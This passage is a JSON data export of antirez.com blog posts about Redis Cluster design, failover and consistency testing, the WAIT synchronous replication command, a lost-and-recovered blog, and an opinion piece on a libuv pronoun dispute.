as well.  3) If you think at \u201c2\u201d you\u2019ll see that actually this means that the divergence between a master and its slaves is unbound. A slave can be lagging for hours in theory. So actually there is another heuristic in use, consisting on slaves to don\u2019t try to get elected at all if the last time they received data from the master is too much in the past. This maximum time is currently set to ten times node-timeout, however it will be user-configurable in the stable release of Redis Cluster. While usually the lag between master and slaves is in the sub-millisecond figure, this time limit ensures that the worst case scenario is the following:  - A slave is stopped/unavailable for just a little less than ten times node-timeout. - Its master fails. - At the same time the slave returns back available.  Rejoins went wrong ===  There is another failure mode that was worth covering in Redis Cluster as it is in some way a different instance of the same problems covered so far. What happens if a master rejoins the cluster after it was already failed over, and there are still clients with non updated configuration writing to it?  This may happens in two main ways: rejoining the majority after a partition, and restarting the process. The failure mode is conceptually the same, the master is not able to get a synchronous acknowledge from other replicas about every write, and the other nodes may take a few milliseconds before being able to reconfigure a node that just rejoined (the node is usually reconfigured with an UPDATE message as soon as it is detected to have a stale configuration: this usually happens immediately once the rejoining instance pings another node or sends a pong in reply to a ping).  Rejoins are handled with another heuristic:  4) When a node rejoins the majority, or is restarted, it waits a small time (but yet a few order of magnitudes bigger than the usual network latency), before accepting writes again, in order to maximize the probability to get reconfigured before accepting writes from clients with stale information.  History re-play ===  Some of the Redis data structures and operations are commutative. Obvious examples are INCR and SADD, the order of operations does not matter and eventually the Set or the counter will have the same exact value as long as all the operations are executed.  Because of this observation, and since Redis instances get asynchronous acknowledges from slaves about how much data was processed, it is possible for partitioned masters to remember commands sent by clients that are still not acknowledged by all the replicas.  This trick is able to improve data safety in a way similar to AP systems, but while in AP systems merging values is used, Redis Cluster would reply commands from clients instead.  I proposed this idea in a blog post [3] some time ago, however this is a practical example of what would happen implementing it in a next version of Redis Cluster:  - A master gets partitioned away with clients. - Clients write to the master for node-timeout time. - The master starts returning errors. - In the majority side, a slave is elected as the new master. - When the old master rejoins it is reconfigured as a replica of the new master.  So far this is the description of what happens currently. With node replying what would happen is that all the writes not acknowledged, from the time the partition is created, to the time the master starts to reply with errors, are accumulated. When the partition heals, as part of turning the old master into a slave, the old master would connect with the new master, and re-play the accumulated stream of commands.  How all this is tested? ===  Some time ago I wrote about what I use in order to test Redis Cluster [4]. The most valuable tool I found so far is a simple consistency-test that is part of the redis-rb-cluster project [5] (a Ruby Redis Cluster client). Basically stress testing the system is as simple as keeping the consistency test running, while simulating different partitions, restarts, and other failures in the cluster.  This test was so useful and is so simple to run, that I\u2019m actually starting to think that everybody running a distributed database in production, whatever it is Cassandra or Zookeeper or Redis or whatever else, should keep a similar test running against the production system as a way to monitor what is happening.  Such tests are lightweight to run, they can be made to just set a few keys per second. However they can easily detect issues with the implementation or other unexpected consistency issues. Especially systems merging data that are at the same time always available, such as AP systems, have the tendency to \u201cmask\u201d bugs: it takes some luck to discover some consistency leak in real data sets. With a simple consistency test running instead it is possible to monitor how the system is behaving.  The following for example is the output of constency-test.rb running against my testing environment:  27523967 R (7187 err) | 27523968 W (7186 err) | 12 noack |  So I know that I read/wrote 27 million of times during my testing, and 12 writes that received no acknowledge were actually materialized inside the database.  Notes:  [1] https://groups.google.com/d/msg/redis-db/2laQRKBKkYg/ssaiQLhasNkJ [2] http://antirez.com/news/67 [3] http://antirez.com/news/68 [4] http://antirez.com/news/69 [5] https://github.com/antirez/redis-rb-cluster Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2014-01-20T16:13:56Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 5693.7773189, "slug": "redis-cluster-and-limiting-divergences-70", "topics": []}}, {"model": "app.post", "pk": 71, "fields": {"title": "Some fun with Redis Cluster testing", "link": "http://antirez.com/news/69", "source": 1, "normalized_link": "antirez.com/news/69", "summary": "One of the steps to reach the goal of providing a \"testable\" Redis Cluster experience to users within a few weeks, is some serious testing that goes over the usual \"I'm running 3 nodes in my macbook, it works\". Finally this is possible, since Redis Cluster entered into the \"refinements\" stage, and most of the system design and implementation is in its final form already.  In order to perform some testing I assembled an environment like that:  * Hardware: 6 real computers: 2 macbook pro, 2 macbook air, 1 Linux desktop, 1 Linux tiny laptop called EEEpc running with a single core at 800Mhz.  * Network: the six nodes were wired to the same network in different ways. Two nodes connected via ethernet, and four over wifi, with different access points. Basically there were three groups. The computers connected with the ethernet had 0.3 milliseconds RTT, other two computers connected with  a near access point were at around 5 milliseconds, and another group of two with another access point were not very reliable, sometime some packet went lost, latency spikes at 300-1000 milliseconds.  During the simulation every computer ran Partitions.tcl (http://github.com/antirez/partitions) in order to simulate network partitions three times per minute, lasting an average of 10 seconds. Redis Cluster was configured to detect a failure after 500 milliseconds, so these settings are able to trigger a number of failover procedures.  Every computer ran the following:  Computer 1 and 2: Redis cluster node + Partitions.tcl + 1 client Computer 3 to 6: Redis cluster node + Partitions.tcl  The cluster was configured to have three masters and three slaves in total.  As client software I ran the cluster consistency test that is shipped with redis-rb-cluster (http://github.com/antirez/redis-rb-cluster), that performs atomic counters increments remembering the value client side, to detect both lost writes and non acknowledged writes that were actually accepted by the cluster.  I left the simulation running for about 24 hours, however there were moments where the cluster was completely down due to too many nodes being down.  The bugs ===  The first thing that happened in the simulation was, a big number of crashes of nodes\u2026 the simulation was able to trigger bugs that I did not noticed in the past. Also there were obvious mis-behavior due to the fact that one node, the eeepc one, was running a Redis server compiled with a 32 bit target. So in the first part of the simulation I just fixed bugs:  7a666ac Cluster: set n->slaves to NULL in clusterNodeResetSlaves(). fda91db Cluster: check link is valid before sending UPDATE. f57bb36 Cluster: initialize todo_before_sleep flags to 0. c70c0c6 Cluster: use proper type mstime_t for ping delay var. 7c1cbdc Cluster: use an hardcoded 60 sec timeout in redis-trib connections. 47815d3 Fixed clearNodeFailureIfNeeded() time type to mstime_t. e88e6a6 Cluster: use long long for timestamps in clusterGenNodesDescription().  The above commits made yesterday are a mix of bugs reported by valgrind (for some part of the simulation there were nodes running over valgrind), crashes, and misbehavior of the 32 bit instance.  After all the above fixes I left the simulation running for many hours without being able to trigger any crash. Basically the simulation \u201cpayed itself\u201d just for this bug fixing activity\u2026 more minor bugs were found during the simulation that I\u2019ve yet to fix.  Behavior under partition ===  One of the important goals of this simulation was to test how Redis Cluster performed under partitions. While Redis Cluster does not feature strong consistency, it is designed in order to minimize write loss under some very common failure modes, and to contain data loss within a given max window under other failure modes.  To understand how it works and the failure modes is simple because the way Redis Cluster itself works is simple to understand and predict. The system is just composed of different master instances handling a subset of keys each. Every master has from 0 to N replicas. In the specific case of the simulation every master had just one replica.  The most important aspect regarding safety and consistency of data is the failover procedure, that is executed as follows:  * A master must be detected as failing, according to the configured \u201cnode timeout\u201d. I used 500 milliseconds as node timeout. However a single node cannot start a failover if it just detects a master is down. It must receive acknowledgements from the majority of the master nodes in order to flag the node as failing. * Every slave that flagged a node as failing will try to be elected to perform the failover. Here we use the Raft protocol election step, so that only a single slave will be able to get elected for a given epoch. The epoch will be used in order to version the new configuration of the cluster for the set of slots served by the old master.  Once a slave performs the failover it reclaims the slots served by its master, and propagates the information ASAP. Other nodes that have an old configuration are updated by the cluster at a latter time if they were not reachable when the failover happened.  Since the replication is asynchronous, and when a master fails we pick a slave that may not have all the master data, there are obvious failure modes where writes are lost, however Redis Cluster try to do things in order to avoid situations where, for example, a client is writing forever to a master that is partitioned away and was already failed over in the majority side.  So this are the main precautions used by Redis Cluster to limit lost writes:  1) Not every slave is a candidate for election. If a slaves detects its data is too old, it will not try to get elected. This in practical terms means that the cluster does not recover in the case where none of the slaves of a master are able to talk with the master for a long time, the master fails, the slave are available but have very stale data. 2) If a master is isolated in the minority side of the cluster, that means, it senses the majority of the other masters are not reachable, it stops accepting writes.  There are still things to improve in the heuristics Redis Cluster uses to limit data loss, for example currently it does not use the replication offset in order to give an advantage to the slave with the most fresh version of data, but only the \u201cdisconnection time\u201d from the master. This will be implemented in the next days.  However the point was to test how these mechanisms worked in the practice, and also to have a way to measure if further improvements will lead to less data loss.  So this is the results obtained in this first test:  * 1000 failovers * 8.5 million writes performed by each client * The system lost 2000 writes. * The system retained 800 not acknowledged writes.  The amount of lost writes could appears to be extremely low considered the number of failovers performed. However note that the test program ran by the client was conceived to write to different keys so it was very easy when partitioned into a minority of masters for the client to hit an hash slot not served by the reachable masters. This resulted into waiting for the timeout to occur before of the next write. However writing to multiple keys is actually the most common case of real clients.  Impressions ===  Running this test was pretty interesting from the point of view of the paradigm shift from Redis to Redis Cluster. When I started the test there were the bugs mentioned above still to fix, so instances crashed from time to time, still the client was almost always able to write (unless there was a partition that resulted into the cluster not being available). This is an obvious result of running a cluster, but as I\u2019m used to see a different availability patter with what is currently the norm with Redis, this was pretty interesting to touch first hand.  Another positive result was that the system worked as expected in many ways, for example the nodes always agreed about the configuration when the partitions healed, there was never a time in which I saw no partitions and the client not able to reach all the hash slots and reporting errors.  The failure detection appeared to be robust enough, especially the computer connected with a very high latency network, from time to time appeared to be down to a single node, but that was not enough to get the agreement from the other nodes, avoiding a number of useless failover procedures.  At the same time I noticed a number of little issues that must be fixed. For example at some point there was a power outage and the router rebooted, causing many nodes to change address. There is a built-in feature in Redis Cluster so that the cluster reconfigures itself automatically with the new addresses as long as there is a node that did not changed address, assuming every node can reach it. This system worked only half-way, and I noticed that indeed the implementation was not yet complete.  Future work ===  This is just an initial test, and this and other tests will require to be the norm in the process of testing Redis Cluster. The first step will be to create a Redis Cluster testing environment that will be shipped with the system and that the user can run, so it is possible that the cluster will be able to support a feature to simulate partitions easily.  Another thing that is worthwhile with the current test setup using partitions.tcl is the ability of the test client, and of Partitions.tcl itself, to log events. For example with a log of partitions and data loss events that has accurate enough timestamps it is possible to correlate data loss events with partitions setups.  If you are interested in playing with Redis Cluster you can follow the Redis Cluster tutorial here: http://redis.io/topics/cluster-tutorial Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2013-12-18T15:32:21Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 5630.3618744, "slug": "some-fun-with-redis-cluster-testing-71", "topics": []}}, {"model": "app.post", "pk": 72, "fields": {"title": "Redis as AP system, reloaded", "link": "http://antirez.com/news/68", "source": 1, "normalized_link": "antirez.com/news/68", "summary": "So finally something really good happened from the Redis criticism thread.  At the end of the work day I was reading about Redis as AP and merge operations on Twitter. At the same time I was having a private email exchange with Alexis Richardson (from RabbitMQ, and, my boss). Alexis at some point proposed that perhaps a way to improve safety was to asynchronously ACK the client about what commands actually were not received so that the client could retry. This seemed a lot of efforts in the client side, but somewhat totally opened my view on the matter.  So the idea is, we can't go for synchronous replication, but indeed we get ACKs from the replicas, asynchronous ACKS, specifically. What about retaining all the writes not acknowledged into a buffer, and \"re-play\" them to the current master when the partition heals? The window we need to require to take the log is very small if the ACKs are frequent enough (currently the frequency is 1 per second, but this could be more easily). If we give up Availability after N times the window we can say, ok, no more room, we now start to reply with errors to queries.  The HUGE difference with this approach is that this works regardless of the size of values. There are also semantical differences since the stream of operations is preserved instead of the value itself, so there is more context. Think for example about INCR.  Of course this would not work for anything, but one could mark in the command table what command to reply and what to discard. SADD is an example of perfect command since the order of operations does not matter. DEL is likely something to avoid replying. And so forth. In turn if we reply against the wrong (stale) master, it will accumulate the commands and so forth. Details may vary, but this is the first thing that really makes a difference.  Probably many of you that are into eventually consistent databases know about the log VS merge strategies already, but I had to re-invent the wheel as I was not aware. This is the kind of feedback I expected in the Redis thread that I did not received.  Another cool thing about this approach is that it's pretty opt-in, it can be just a state in the connection. Send a command and the connection is of \"safe\" type, so all the commands sent will be retained and replayed if not acknowledged, and so forth.  This is not going to be in the first version of Redis Cluster as I'm more happy to ship ASAP the current design, but it is a solid incremental idea that could be applied later, so a little actual result into the evolution of the design. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2013-12-11T21:19:21Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 5617.3845411, "slug": "redis-as-ap-system-reloaded-72", "topics": []}}, {"model": "app.post", "pk": 73, "fields": {"title": "The Redis criticism thread", "link": "http://antirez.com/news/67", "source": 1, "normalized_link": "antirez.com/news/67", "summary": "A few days ago I tried to do an experiment by running some kind of \u201ccall for critiques\u201d in the Redis mailing list:  https://groups.google.com/forum/#!topic/redis-db/Oazt2k7Lzz4  The thread has reached 89 posts so far, probably one of the biggest threads in the history of the Redis google group. The main idea was that critiques are a mix of pointless attacks, and truth, so to extract the truth from critiques can be a good exercise, it means to have some seed idea for future improvements from the part of the population that is not using or is not happy with your system.  There were a lot of arguments possible: threading, persistence model, API, security, and so forth, however the argument that received the most attention was Redis Cluster design and its tradeoffs. There are people that are not convinced by the proposed design since it does not provide strong Consistency nor Availability (\u201cC\u201d and \u201cA\u201d of CAP, not any random consistency or availability).  Instead it only provides some form of weaker consistency and some failure resistance. In this blog post I want to clarify why this is in my opinion the right choice for Redis.  Strong consistency requires synchronous replication, and depending on the failure models you want to handle, it also requires to fsync data on disk at every write, in order to cover failures like all the nodes in a single data center rebooting for a power outage. Redis is what it is because the performance and latency characteristics, so a model like the above would not be Redis.  So Redis Cluster trades Consistency for performance. The tradeoff is that there are well defined failure modes where it is possible to lose writes, however the system is designed in order to minimize lost writes under certain assumptions.  The other property we give away is availability, because being available means, in order to have a decent consistency story, to merge values when partitions heals. Redis data model is not merge-friendly, Redis uses the fact that data representation is in memory to get an advantage and export rich data structures to the user that have practically no limits in the size of every single value, if not the available memory. So there are Redis deployments with just a few keys, with sorted set values of many million of elements, to implement leader boards of Facebook games, and stuff like that.  Merging huge and complex values is extremely hard and not very practical. Implementing the values in a way that makes merging more manageable would mean instead to forget the current performance at all.  So we trade Availability for a more powerful data model. We still have some degree of resistance to failures. Nodes can stop working and partitions can happen, and as long as there is the majority of master nodes up and at least a replica for each hash slot, the system is able to accept queries from clients.  I believe this is a perfectly acceptable design and is able to provide great performances with consistency and availability guarantees that are reasonable for many class of applications. To get an idea about how it is possible to lose writes you can read the Redis Cluster tutorial here: http://redis.io/topics/cluster-tutorial  Note that in the meantime Redis unstable got an implementation of synchronous replication. It is not capable of providing strong consistency alone, but it is able to improve the consistency guarantees that the system is able to provide for certain writes (less / hard to trigger failure modes). However I believe that most users want Redis for very high loads, so this feature will likely be not very used.  Why Redis Cluster? ===  The real goal of Redis Cluster is not to provide the coolest consistent or available system, its goal was to provide what Redis is, but distributed in many nodes with *automatic sharding*. That was the real trigger: users can\u2019t reinvent again and again client-side sharding, something that can do this for you is very useful, especially if it is designed in a way that 100 nodes will provide the performances of a single instance multiplied by 100.  This is the main reason I want to see it working and deployed, because I believe it can make a huge difference for the Redis users. Being it a distributed system it should also be operational friendly (that was another design goal), provide some resistance to failure, and easy to predict failure modes. So consistency and availability are automatically concerns and huge part of the tradeoffs to make of course.  I\u2019m excited about Redis Cluster. I truly believe it will benefit many users.  Redis became what it is, this strange tool that many developers learned to live and to solve problems with, because I tried to never be dogmatic about the development process and the tradeoffs, sometimes extreme, to take. For example the fact that Redis is probably the only top-used database system developed mostly by a single individual currently (at our max we were Pieter half-time and I full-time) is the result of this choices: I\u2019m not magic, the only way to do it is to realize your limits and design and plan for them.  So, as long as there are users doing good work with it, the Redis experiment is here to stay. Ended the thread I\u2019ll start with my usual routine, grab a coffee in the morning, sit in the front of my computer, and do the only thing I\u2019m really good at: write some code.  Thanks everybody that took part to the thread. Probably I would not do it again, since it was more stressful than useful honestly, however sometimes odd things must be tried, and it feels great to don\u2019t fear the critiques.  Write code and be free. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2013-12-09T23:53:03Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 5613.7494744, "slug": "the-redis-criticism-thread-73", "topics": []}}, {"model": "app.post", "pk": 74, "fields": {"title": "WAIT: synchronous replication for Redis", "link": "http://antirez.com/news/66", "source": 1, "normalized_link": "antirez.com/news/66", "summary": "Redis unstable has a new command called \"WAIT\". Such a simple name, is indeed the incarnation of a simple feature consisting of less than 200 lines of code, but providing an interesting way to change the default behavior of Redis replication.  The feature was extremely easy to implement because of previous work made. WAIT was basically a direct consequence of the new Redis replication design (that started with Redis 2.8). The feature itself is in a form that respects the design of Redis, so it is relatively different from other implementations of synchronous replication, both at API level, and from the point of view of the degree of consistency it is able to ensure.  Replication: synchronous or not? ===  Replication is one of the main concepts of distributed systems. For some state to be durable even when processes fail or when there are network partitions making processes unable to communicate, we are forced to use a simple but effective strategy, that is to take the same information \u201creplicated\u201d across different processes (database nodes).  Every kind of system featuring strong consistency will use a form of replication called synchronous replication. It means that before some new data is considered \u201ccommitted\u201d, a node requires acknowledge from other nodes that the information was received. The node initially proposing the new state, when the acknowledge is received, will consider the information committed and will reply to the client that everything went ok.  There is a price to pay for this safety: latency. Systems implementing strong consistency are unable to reply to the client before receiving enough acknowledges. How many acks are \u201cenough\u201d? This depends on the kind of system you are designing. For example in the case of strong consistent systems that are available as long as the majority of nodes are working, the majority of the nodes should reply back before some data is considered to be committed. The result is that the latency is bound to the slowest node that replies as the (N/2+1)th node. Slower nodes can be ignored once the majority is reached.  Asynchronous replication ===  This is why asynchronous replication exists: in this alternative model we reply to the client confirming its write BEFORE we get acknowledges from other nodes. If you think at it from the point of view of CAP, it is like if the node *pretends* that there is a partition and can\u2019t talk with the other nodes. The information will eventually be replicated at a latter time, exactly like an eventually consistent DB would do during a partition. Usually this latter time will be a few hundred microseconds later, but if the node receiving the write fails before propagating the write, but after it already sent the reply to the client, the write is lost forever even if it was acknowledged.  Redis uses asynchronous replication by default: Redis is designed for performances and low, easy to predict, latency. However if possible it is nice for a system to be able to adapt consistency guarantees depending on the kind of write, so some form of synchronous replication could be handy even for Redis.  WAIT: call me synchronous if you want. ===  The way I depicted synchronous replication above, makes it sound simpler than it actually is.  The reality is that usually synchronous replication is \u201ctransactional\u201d, so that a write is propagated to the majority of nodes (or *all* the nodes with some older algorithm), or none, in one way or the other not only the node proposing the state change must wait for a reply from the majority, but also the other nodes need to wait for the proposing node to consider the operation committed in order to, in turn, commit the change. Replicas require in one way or the other a mechanism to collect the write without applying it, basically.  This means that nothing happens during this process, everything is blocked for the current operation, and later you can process a new one, and so forth and so forth.  Because synchronous replication can be very costly, maybe we can do with a bit less? We want a way to make sure some write propagated across the replicas, but at the same time we want other clients to go at light speed as usually sending commands and receiving replies. Clients waiting in a synchronous write should never block any other client doing other synchronous or non-synchronous work.  There is a tradeoff you can take: WAIT does not allow to rollback an operation that was not propagated to enough slaves. It only offers, merely, a way to inform the client about what happened. The information, specifically, is the number of replicas that your write was able to reach, all this encapsulated into a simple to use blocking command.  This is how it works:  redis 127.0.0.1:9999> set foo bar OK redis 127.0.0.1:9999> incr mycounter (integer) 1 redis 127.0.0.1:9999> wait 5 100 (integer) 7  Basically you can send any number of commands, and they\u2019ll be executed, and replicated as usually. As soon as you call WAIT however the client stops until all the writes above are successfully replicated to the specified number of replicas (5 in the example), unless the timeout is reached (100 milliseconds in the example).  Once one of the two limits is reached, that is, the master replicated to 5 replicas, or the timeout was reached, the command returns, sending as reply the number of replicas reached. If the return value is less than the replicas we specified, the request timed out, otherwise the above commands were successfully replicated to the specified number of replicas.  In practical terms this means that you have to deal with the condition in which the command was accepted by less replicas you specified in the amount of time you specified. More about that later.  How it works? ===  The WAIT implementation is surprisingly simple. The first thing I did was to take the blocking code of BLPOP & other similar operations and make it a generic primitive of Redis internal API, so now implementing blocking commands is much simpler.  The rest of the implementation was trivial because 2.8 introduced the concept of master replication offset, that is, a global offset that we increment every time we send something to the slaves. All the salves receive exactly the same stream of data, and remember the offset processed so far as well.  This is very useful for partial resynchronization as you can guess, but moreover slaves acknowledge the amount of replication offset processed so far, every second, with the master, so the master has some idea about how much they processed.  Every second sucks right? We can\u2019t base WAIT on an information available every second. So when WAIT is used by a client, it sets a flag, so that all the WAIT callers in a given event loop iteration will be grouped together, and before entering the event loop again we send a REPLCONF GETACK command into the replication stream. Slaves will reply ASAP with a new ACK.  As soon as the ACKs received from slaves is enough to unblock some client, we do it. Otherwise we unblock the client on timeout.  Not considering the refactoring needed for the block operations that is technically not part of the WAIT implementation, all the code is like 170 lines of code, so very easy to understand, modify, and with almost zero effects on the rest of the code base.  Living with the indetermination ===  WAIT does not offer any \u201ctransactional\u201d feature to commit a write to N nodes or nothing, but provides information about the degree of durability we achieved with our write, in an easy to use form that does not slow down operations of other clients.  How this improves consistency in Redis land? Let\u2019s look at the following pseudo code:      def save_payment(payment_id)         redis.set(payment_id,\u201dconfirmed\u201d)     end  We can imagine that the function save_payment is called every time an user payed for something, and we want to store this information in our database. Now imagine that there are a number of clients processing payments, so the function above gets called again and again.  In Redis 2.6 if there was an issue communicating with the replicas, while running the above code, it was impossible to sense the problem in time. The master failing could result in replicas missing a number of writes.  In Redis 2.8 this was improved by providing options to stop accepting writes if there are problems communicating with replicas. Redis can check if there are at least N replicas that appear to be alive (pinging back the master) in this setup. With this option we improved the consistency guarantees a bit, now there is a maximum window to write to a master that is not backed by enough replicas.  With WAIT we can finally considerably improve how much safe are our writes, since I can modify the code in the following way:      def save_payment(payment_id)         redis.set(payment_id,\u201dconfirmed\u201d)         if redis.wait(3,1000) >= 3 then             return true         else             return false     end  In the above version of the program we finally gained some information about what happened to the write, even if we actually did not changed the outcome of the write, we are now able to report back this information to the caller. However what to do if wait returns less than 3? Maybe we could try to revert our write sending redis.del(payment_id)?  Or we can try to set the value again in order to succeed the next time?  With the above code we are exposing our system to too much troubles. In a given moment if only two slaves are accepting writes all the transactions will have to deal with this inconsistency, whatever it is handled. There is a better thing we can do, modifying the code in a way so that it actually does not set a value, but takes a list of events about the transaction, using Redis lists:      def save_payment(payment_id)         redis.rpush(payment_id,\u201din progress\u201d) # Return false on exception         if redis.wait(3,1000) >= 3 then             redis.rpush(payment_id,\u201dconfirmed\u201d) # Return false on exception             if redis.wait(3,1000) >= 3 then                 return true             else                 redis.rpush(payment_id,\u201dcancelled\u201d)                 return false             end         else             return false     end  Here we push an \u201cin progress\u201d state into the list for this payment ID before to actually confirming it. If we can\u2019t reach enough replicas we abort the payment, and it will not have the \u201cconfirmed\u201d element. In this way if there are only two replicas getting writes the transactions will fail one after the other. The only clients that will have the deal with inconsistencies are the clients that are able to propagate \u201cin progress\u201d to 3 or more replicas but are not able to do the same with the \u201cconfirmed\u201d write. In the above code we try to deal with this issue with a best-effort \u201ccancelled\u201d write, however there is still the possibility of a race condition:  1) We send \u201cin progress\u201d 2) We send \u201cconfirmed\u201d, it only reaches 2 slaves. 3) We send \u201ccancelled\u201d but at this point the master crashed and a failover elected one of the slaves.  So in the above case we returned a failed transaction while actually the \u201cconfirmed\u201d state was written.  You can do different things to deal better with this kind of issues, that is, to mark the transaction as \u201cbroken\u201d in a strong consistent and highly available system like Zookeeper, to write a log in the local client, to put it in the hands of a message queue that is designed with some redundancy, and so forth.  Synchronous replication and failover: two close friends ===  Synchronous replication is important per se because it means, there are N copies of this data around, however to really exploit the improved data safety, we need to make sure that when a master node fails, and a slave is elected, we get the best slave.  The new implementation of Sentinel already elects the slave with the best replication offset available, assuming it publishes its replication offset via INFO (that is, it must be Redis 2.8 or greater), so a good setup can be to run an odd number of Redis nodes, with a Redis Sentinel installed in every node, and use synchronous replication to write to the majority of nodes. As long as the majority of the nodes is available, a Sentinel will be able to win the election and elect a slave with the most updated data.  Redis cluster is currently not able to elect the slave with the best replication offset, but will be able to do that before the stable release. It is also conceivable that Redis Cluster will have an option to only promote a slave if the majority of replicas for a given hash slot are reachable.  I just scratched the surface of synchronous replication, but I believe that this is a building block that we Redis users will be able to exploit in the future to stretch Redis capabilities to cover new needs for which Redis was traditionally felt as inadequate. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2013-12-05T09:50:33Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 5604.9461411, "slug": "wait-synchronous-replication-for-redis-74", "topics": []}}, {"model": "app.post", "pk": 75, "fields": {"title": "Blog lost and recovered in 30 minutes", "link": "http://antirez.com/news/65", "source": 1, "normalized_link": "antirez.com/news/65", "summary": "Yesterday I lost all my blog data in a rather funny way. When I installed this new blog engine, that is basically a Lamer News slightly modified to serve as a blog, I spinned a Redis instance manually with persistence *disabled* just to see if it was working and test it a bit.  I just started a screen instance, and run something like ./redis-server --port 10000. Since this is equivalent to an empty config file with just \"port 10000\" inside I was running no disk backed at all.  Since Redis very rarely crashes, guess what, after more than one year it was still running inside the screen session, and I totally forgot that it was running like that, happily writing controversial posts in my blog. Yesterday my server was under attack. This caused an higher then normal load, and Linode rebooted the instance. As a result my blog was gone.  The good thing is that I recovered everything in about 30 minutes because simple systems are really better than complex systems when something bad happens. This blog is composed of posts that are just the verbatim dump of what I write in a text area. No formatting at all. Comments are handled by Disqus and the ID I submit is just the post ID.  All I had to do is to setup a new Redis server (this time with AOF, demonized, and a proper configuration file) and search in google one after the other the posts by URL (which is the same for all the post, only the incremental ID changes). For every post I opened the Google cache of the post, select the text, copy, and submit the new post.  The only thing I lost are the post dates... I could fix them modifying a bit the blog code to allow me to do this, but not sure I'll be able to find the time.  Long story short, this is a trivial example, and an human error, but even in serious well maintained systems shit happens, and when the architecture of something is simple, it is simpler to deal with even during failures.  Without to mention that now I know I don't have to enable backups as I can recovery everything. No, just kidding. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2013-12-02T08:52:19Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 5599.1084967, "slug": "blog-lost-and-recovered-in-30-minutes-75", "topics": []}}, {"model": "app.post", "pk": 76, "fields": {"title": "The fight against sexism is not a free pass", "link": "http://antirez.com/news/64", "source": 1, "normalized_link": "antirez.com/news/64", "summary": "Today Joyent wrote a blog post in the company blog about an issue that started with this pull request in the libuv project: https://github.com/joyent/libuv/pull/1015#issuecomment-29538615  Basically the developer Ben Noordhuis rejected a pull request involving a change in the documentation to use gender-neutral form instead of \u201chim\u201d. Joyent replied with this incredible post: http://www.joyent.com/blog/the-power-of-a-pronoun.  In the blog post you can read:  \u201cBut while Isaac is a Joyent employee, Ben is not\u2014and if he had been, he wouldn't be as of this morning: to reject a pull request that eliminates a gendered pronoun on the principle that pronouns should in fact be gendered would constitute a fireable offense for me and for Joyent.\u201d  A few lines later you can read: \u201cIndeed, one of the challenges of an open source project that depends on volunteer effort isdealing with assholes\u201d  Maybe Joyent is thinking something like, you can\u2019t go wrong if you fight sexism, or something like that, as I can\u2019t believe they had a so naive reaction. Really, we have 10k years of culture for a reason, to be able to discriminate more than that, it is not 2+2=4.  Probably Ben is not a sexist, maybe he believes simply that \u201chim\u201d does not make a difference in sexism every day. Everybody has his fight, and changing \u201chim\u201d in not the Ben fight, but possibly when Ben will have to evaluate a female candidate, he will use a truly meritocratic meter and WILL NOT GIVE A FUCK about the gender, like he did when refusing the pull request.  You can\u2019t bash people that don\u2019t have your vision, and you can\u2019t think that the fight against sexism is a free pass. Joyent, you are liable of your actions, and your actions violate more fundamental civil rights than you think.  But the most disturbing thing is that companies act like that because of fear, the fear of the reaction of people that believe that the world is black or white, and that if you don\u2019t see it the same color they see it, you are to blame, you are to crucify. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2013-12-01T15:48:37Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 5597.7435633, "slug": "the-fight-against-sexism-is-not-a-free-pass-76", "topics": []}}, {"model": "app.post", "pk": 77, "fields": {"title": "Finally Redis collections are iterable", "link": "http://antirez.com/news/63", "source": 1, "normalized_link": "antirez.com/news/63", "summary": "Redis API for data access is usually limited, but very direct and straightforward.  It is limited because it only allows to access data in a natural way, that is, in a data structure obvious way. Sorted sets are easy to access by score ranges, while hashes by field name, and so forth. This API \u201cway\u201d has profound effects on what Redis is and how users organize data into it, because an API that is data-obvious means fast operations, less code and less bugs in the implementation, but especially forcing the application layer to make meaningful choices: the database as a system in which you are responsible of organizing data in a way that makes sense in your application, versus a database as a magical object where you put data inside, and then it will be able to fetch and organize data for you in any format.  However most Redis data types, including the outer key-value shell if we want to consider it a data type for a moment (it is a dictionary after all), are collections of elements. The key-value space is a collection of keys mapped to values, as Sets are collections of unordered elements, and so forth.  In most application logic using Redis the idea is that you know what member is inside a collection, or at least you know what member you should test for existence. But life is not always that easy, and sometimes you need something more, that is, to scan the collection in order to retrieve all the elements inside. And yes, since this is a common need, we have commands like SMEMBERS or HGETALL, or even KEYS, in order to retrieve everything there is inside a collection, but those commands are always a last-resort kind of deal, because they are O(N) operations.  Your collection is very small? Fine, use SMEMBERS and you get Redis-alike performances anyway. Your collection is big? Don\u2019t use O(N) commands if not for \u201cdebugging\u201d purposes. A popular example is the misused KEYS command, source of troubles for non-experts, and top hit among the Redis slow log entries.  Black holes ===  The problem is that because of O(N) operations, Redis collections, (excluding Sorted Sets that can be accessed by rank, in ranges, and in many other different ways), tend to be black holes where you put things inside, and you can hardly explore them again.  And there are plenty of reasons to explore what is inside. For example garbage collection tasks, schema migration, or even fixing what is inside keys after an application bug corrupted some data.  What we really needed was an iterator. Pieter Noordhuis and I were very aware of this problem since the early days of Redis, but it was a major design challenge because traditionally the deal is, you want a data structure to be iterable? Well, this is going to be a sorted tree-like data structure, with the concept of previous and next element.  Instead most Redis data types are based on hash tables, and Redis hash tables are even of the most particular kind, as them automatically and incrementally resize, so sometime you even have two tables at the same time slowly exchanging elements from one to the other.  Hash tables are cool because they have a good memory efficiency, and the constant-time access property. What we use is power-of-two sized hash tables, with chaining for collision handling, and this has worked pretty well so far. An indirect indicator is that sorted sets, the only data structure we have that is based on a tree-alike structure (skip lists) is 